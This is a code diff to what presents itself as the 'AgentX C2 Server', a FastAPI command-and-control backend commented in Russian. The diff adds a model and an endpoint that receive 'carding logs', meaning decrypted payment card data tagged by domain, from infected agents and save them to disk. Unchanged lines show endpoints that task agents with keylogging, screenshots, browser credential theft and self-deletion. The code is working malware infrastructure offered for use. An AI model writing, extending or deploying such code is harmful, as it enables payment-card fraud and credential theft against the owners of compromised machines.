@@ -6,6 +6,8 @@ import uuid
 from typing import Dict, List, Any, Optional
 import logging
 import uvicorn
+import json # Для сохранения логов
+import os # Для пути к логам
 
 # Импортируем модели данных и типы команд
 from src.agent_protocol.protocol import AgentInfo, Task, CommandType, C2Response
@@ -14,11 +16,23 @@ from src.agent_protocol.protocol import AgentInfo, Task, CommandType, C2Response
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger('C2Server')
 
-app = FastAPI(title="AgentX C2 Server", version="0.2.0")
+# Путь для сохранения логов кардинга
+CARDING_LOG_DIR = "c2_logs"
+if not os.path.exists(CARDING_LOG_DIR):
+    os.makedirs(CARDING_LOG_DIR)
+
+app = FastAPI(title="AgentX C2 Server", version="0.2.1")
 
 # Хранилище данных агентов и задач (в памяти)
 # TODO: Перейти на Redis или другую персистентную БД
 agent_db: Dict[str, AgentInfo] = {}
+
+# --- Модель данных для логов кардинга ---
+class CardingLogEntry(BaseModel):
+    id: int # ID из локальной базы агента
+    domain: str
+    data: Dict[str, Any] # Расшифрованные данные карты
+    timestamp: int
 
 # --- Вспомогательные функции ---
 
@@ -249,7 +263,7 @@ def task_get_keylogs(agent_id: str = Path(...)):
 
 @app.post("/agents/{agent_id}/screenshot", response_model=Task)
 def task_screenshot(agent_id: str = Path(...)):
-    """Создает задачу снятия скриншота"""
+    """Создает задачу снятия скриншота для агента"""
     task = create_task(agent_id, CommandType.SCREENSHOT)
     if not task:
         raise HTTPException(status_code=404, detail="Agent not found or offline")
@@ -257,8 +271,7 @@ def task_screenshot(agent_id: str = Path(...)):
 
 @app.post("/agents/{agent_id}/steal_credentials", response_model=Task)
 def task_steal_credentials(agent_id: str = Path(...)):
-    """Создает задачу кражи учетных данных браузеров"""
-    # Параметров пока нет, но можно добавить в будущем (например, выбор браузеров)
+    """Создает задачу кражи учетных данных"""
     task = create_task(agent_id, CommandType.STEAL_CREDENTIALS)
     if not task:
         raise HTTPException(status_code=404, detail="Agent not found or offline")
@@ -325,6 +338,39 @@ def task_self_delete(agent_id: str = Path(...)):
     # После этой команды агент должен скоро исчезнуть
     logger.warning(f"Self-delete task created for agent {agent_id}. Agent expected to go offline.")
     return task
+
+# >>> НОВЫЙ ЭНДПОИНТ ДЛЯ ЛОГОВ КАРДИНГА <<<
+@app.post("/api/v1/logs/carding/{agent_id}", response_model=C2Response)
+def post_carding_log(
+    agent_id: str = Path(...),
+    log_entry: CardingLogEntry = Body(...)
+):
+    """Принимает лог кардинга от агента"""
+    if agent_id not in agent_db:
+        # Можно регистрировать агента налету, если его нет?
+        # Пока считаем, что агент должен быть зарегистрирован
+        logger.warning(f"Received carding log from unknown or unregistered agent: {agent_id}")
+        # Не будем возвращать ошибку, просто залогируем
+        # raise HTTPException(status_code=404, detail="Agent not found")
+        pass # Примем лог
+    else:
+        agent = agent_db[agent_id]
+        agent.last_checkin = time.time() # Отмечаем активность агента
+
+    log_filename = os.path.join(CARDING_LOG_DIR, f"carding_{agent_id}.log")
+    try:
+        log_data = log_entry.dict()
+        log_data['received_at'] = time.time()
+        with open(log_filename, 'a') as f:
+            json.dump(log_data, f)
+            f.write('\n')
+        logger.info(f"Received carding log ID {log_entry.id} from agent {agent_id} for domain {log_entry.domain}")
+        return C2Response(status="success", message="Carding log received")
+    except Exception as e:
+        logger.error(f"Failed to save carding log from agent {agent_id}: {e}")
+        raise HTTPException(status_code=500, detail="Failed to process carding log")
+
+# >>> КОНЕЦ НОВОГО ЭНДПОИНТА <<<
 
 # --- Запуск сервера --- 
 if __name__ == "__main__":
